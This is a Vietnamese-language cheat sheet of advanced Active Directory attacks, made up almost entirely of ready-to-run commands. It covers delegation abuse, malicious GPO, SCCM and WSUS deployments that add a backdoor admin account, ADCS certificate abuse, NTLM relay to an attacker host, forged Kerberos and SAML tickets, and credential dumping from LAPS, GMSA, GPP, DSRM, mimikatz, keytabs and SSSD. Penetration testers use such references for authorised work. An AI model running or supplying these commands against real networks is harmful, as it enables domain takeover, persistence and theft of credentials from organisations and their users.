# Tài liệu Tham khảo Các cuộc Tấn công Active Directory Nâng cao

## Mục lục

1. [Tấn công Ủy quyền (Delegation Attacks)](#delegation-attacks)
2. [Lạm dụng Đối tượng Chính sách Nhóm (Group Policy Object Abuse)](#group-policy-object-abuse)
3. [Tấn công RODC](#rodc-attacks)
4. [Triển khai SCCM/WSUS](#sccmwsus-deployment)
5. [Dịch vụ Chứng chỉ AD (AD Certificate Services - ADCS)](#ad-certificate-services-adcs)
6. [Tấn công Quan hệ Tin cậy (Trust Relationship Attacks)](#trust-relationship-attacks)
7. [ADFS Golden SAML](#adfs-golden-saml)
8. [Nguồn Chứng chỉ (Credential Sources)](#credential-sources)
9. [Tích hợp Linux AD](#linux-ad-integration)

---

## Tấn công Ủy quyền (Delegation Attacks)

### Ủy quyền không hạn chế (Unconstrained Delegation)

Khi một người dùng xác thực với một máy tính có tính năng ủy quyền không hạn chế, TGT của họ sẽ được lưu vào bộ nhớ.

**Tìm kiếm Ủy quyền:**

```powershell
# PowerShell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

# BloodHound
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

**Lạm dụng SpoolService:**

```bash
# Kiểm tra dịch vụ spooler
ls \\dc01\pipe\spoolss

# Kích hoạt với SpoolSample
.\SpoolSample.exe DC01.domain.local HELPDESK.domain.local

# Hoặc với printerbug.py
python3 printerbug.py 'domain/user:pass'@DC01 ATTACKER_IP
```

**Giám sát với Rubeus:**

```powershell
Rubeus.exe monitor /interval:1
```

### Ủy quyền có hạn chế (Constrained Delegation)

**Xác định:**

```powershell
Get-DomainComputer -TrustedToAuth | select -exp msds-AllowedToDelegateTo
```

**Khai thác với Rubeus:**

```powershell
# Tấn công S4U2
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

**Khai thác với Impacket:**

```bash
getST.py -spn HOST/target.domain.local 'domain/user:password' -impersonate Administrator -dc-ip DC_IP
```

### Ủy quyền có hạn chế dựa trên Tài nguyên (Resource-Based Constrained Delegation - RBCD)

```powershell
# Tạo tài khoản máy
New-MachineAccount -MachineAccount AttackerPC -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)

# Thiết lập ủy quyền
Set-ADComputer target -PrincipalsAllowedToDelegateToAccount AttackerPC$

# Lấy vé
.\Rubeus.exe s4u /user:AttackerPC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## Lạm dụng Đối tượng Chính sách Nhóm (Group Policy Object Abuse)

### Tìm các GPO dễ bị tổn thương

```powershell
Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs | Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|WriteDacl|WriteOwner")}
```

### Lạm dụng với SharpGPOAbuse

```powershell
# Thêm admin cục bộ
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"

# Thêm quyền người dùng
.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount attacker --GPOName "Vulnerable GPO"

# Thêm tác vụ tức thì
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add" --GPOName "Vulnerable GPO"
```

### Lạm dụng với pyGPOAbuse (Linux)

```bash
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
```

---

## Tấn công RODC

### Thẻ Vàng RODC (RODC Golden Ticket)

RODC chứa bản sao AD đã được lọc (loại trừ các khóa LAPS/Bitlocker). Giả mạo thẻ cho các tài khoản (principals) trong msDS-RevealOnDemandGroup.

### Tấn công RODC Key List

**Yêu cầu:**

- Chứng chỉ krbtgt của RODC (-rodcKey)
- ID của tài khoản krbtgt của RODC (-rodcNo)

```bash
# Impacket keylistattack
keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full

# Sử dụng secretsdump với keylist
secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist
```

**Sử dụng Rubeus:**

```powershell
Rubeus.exe golden /rodcNumber:25078 /aes256:RODC_AES256_KEY /user:Administrator /id:500 /domain:domain.local /sid:S-1-5-21-xxx
```

---

## Triển khai SCCM/WSUS

### Tấn công SCCM với MalSCCM

```bash
# Định vị máy chủ SCCM
MalSCCM.exe locate

# Liệt kê các mục tiêu
MalSCCM.exe inspect /all
MalSCCM.exe inspect /computers

# Tạo nhóm mục tiêu
MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
MalSCCM.exe group /addhost /groupname:TargetGroup /host:TARGET-PC

# Tạo ứng dụng độc hại
MalSCCM.exe app /create /name:backdoor /uncpath:"\\SCCM\SCCMContentLib$\evil.exe"

# Triển khai
MalSCCM.exe app /deploy /name:backdoor /groupname:TargetGroup /assignmentname:update

# Buộc kiểm tra (checkin)
MalSCCM.exe checkin /groupname:TargetGroup

# Dọn dẹp
MalSCCM.exe app /cleanup /name:backdoor
MalSCCM.exe group /delete /groupname:TargetGroup
```

### Tài khoản Truy cập Mạng SCCM (SCCM Network Access Accounts)

```powershell
# Tìm SCCM blob
Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"

# Giải mã với SharpSCCM
.\SharpSCCM.exe get naa -u USERNAME -p PASSWORD
```

### Tấn công Triển khai WSUS

```bash
# Sử dụng SharpWSUS
SharpWSUS.exe locate
SharpWSUS.exe inspect

# Tạo bản cập nhật độc hại
SharpWSUS.exe create /payload:"C:\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user backdoor Password123! /add\"" /title:"Critical Update"

# Triển khai đến mục tiêu
SharpWSUS.exe approve /updateid:GUID /computername:TARGET.domain.local /groupname:"Demo Group"

# Kiểm tra trạng thái
SharpWSUS.exe check /updateid:GUID /computername:TARGET.domain.local

# Dọn dẹp
SharpWSUS.exe delete /updateid:GUID /computername:TARGET.domain.local /groupname:"Demo Group"
```

---

## Dịch vụ Chứng chỉ AD (AD Certificate Services - ADCS)

### ESC1 - Các Mẫu bị cầu hình sai

Mẫu cho phép ENROLLEE_SUPPLIES_SUBJECT với Client Authentication EKU.

```bash
# Tìm các mẫu dễ bị tổn thương
certipy find -u user@domain.local -p password -dc-ip DC_IP -vulnerable

# Yêu cầu chứng chỉ với quyền admin
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -template VulnTemplate -upn administrator@domain.local

# Xác thực
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC4 - Lỗ hổng ACL

```python
# Kiểm tra WriteProperty
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP -get-acl

# Thêm cờ ENROLLEE_SUPPLIES_SUBJECT
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP -add CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT

# Thực hiện ESC1, sau đó khôi phục
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP -value 0 -property mspki-Certificate-Name-Flag
```

### ESC8 - NTLM Relay đến Web Enrollment

```bash
# Bắt đầu relay
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Ép buộc xác thực (Coerce authentication)
python3 petitpotam.py ATTACKER_IP DC_IP

# Sử dụng chứng chỉ
Rubeus.exe asktgt /user:DC$ /certificate:BASE64_CERT /ptt
```

### Shadow Credentials (Chứng chỉ Bóng)

```bash
# Thêm Key Credential (pyWhisker)
python3 pywhisker.py -d "domain.local" -u "user1" -p "password" --target "TARGET" --action add

# Lấy TGT với PKINIT
python3 gettgtpkinit.py -cert-pfx "cert.pfx" -pfx-pass "password" "domain.local/TARGET" target.ccache

# Lấy mã băm (hash) NT
export KRB5CCNAME=target.ccache
python3 getnthash.py -key 'AS-REP_KEY' domain.local/TARGET
```

---

## Tấn công Quan hệ Tin cậy (Trust Relationship Attacks)

### Từ Tên miền Con đến Tên miền Cha (SID History)

```powershell
# Lấy Enterprise Admins SID từ miền cha
$ParentSID = "S-1-5-21-PARENT-DOMAIN-SID-519"

# Tạo Thẻ Vàng với SID History
kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-1-5-21-CHILD-SID /krbtgt:KRBTGT_HASH /sids:$ParentSID /ptt
```

### Từ Rừng đến Rừng (Forest to Forest - Trust Ticket)

```bash
# Kết xuất khóa tin cậy (trust key)
lsadump::trust /patch

# Giả mạo TGT liên vùng (inter-realm)
kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /rc4:TRUST_KEY /user:Administrator /service:krbtgt /target:external.com /ticket:trust.kirbi

# Sử dụng thẻ tin cậy
.\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/target.external.com /dc:dc.external.com /ptt
```

---

## ADFS Golden SAML

**Yêu cầu:**

- Truy cập tài khoản dịch vụ ADFS
- Chứng chỉ ký mã thông báo (PFX + mật khẩu giải mã)

```bash
# Kết xuất với ADFSDump
.\ADFSDump.exe

# Giả mạo mã thông báo SAML
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.domain.local saml2 --endpoint https://target/saml --nameid administrator@domain.local
```

---

## Nguồn Chứng chỉ (Credential Sources)

### Mật khẩu LAPS

```powershell
# PowerShell
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'

# CrackMapExec
crackmapexec ldap DC_IP -u user -p password -M laps
```

### Mật khẩu GMSA

```powershell
# PowerShell + DSInternals
$gmsa = Get-ADServiceAccount -Identity 'SVC_ACCOUNT' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp
```

```bash
# Linux với bloodyAD
python bloodyAD.py -u user -p password --host DC_IP getObjectAttributes gmsaAccount$ msDS-ManagedPassword
```

### Tùy chọn Chính sách Nhóm (Group Policy Preferences - GPP)

```bash
# Tìm trong SYSVOL
findstr /S /I cpassword \\domain.local\sysvol\domain.local\policies\*.xml

# Giải mã
python3 Get-GPPPassword.py -no-pass 'DC_IP'
```

### Chứng chỉ DSRM

```powershell
# Kết xuất băm (hash) DSRM
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Kích hoạt đăng nhập quản trị viên DSRM
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
```

---

## Tích hợp Linux AD

### Sử dụng lại Thẻ CCACHE (CCACHE Ticket Reuse)

```bash
# Tìm thẻ
ls /tmp/ | grep krb5cc

# Sử dụng thẻ
export KRB5CCNAME=/tmp/krb5cc_1000
```

### Trích xuất từ Keytab

```bash
# Liệt kê phím
klist -k /etc/krb5.keytab

# Trích xuất với KeyTabExtract
python3 keytabextract.py /etc/krb5.keytab
```

### Trích xuất từ SSSD

```bash
# Vị trí cơ sở dữ liệu
/var/lib/sss/secrets/secrets.ldb

# Vị trí phím
/var/lib/sss/secrets/.secrets.mkey

# Trích xuất
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
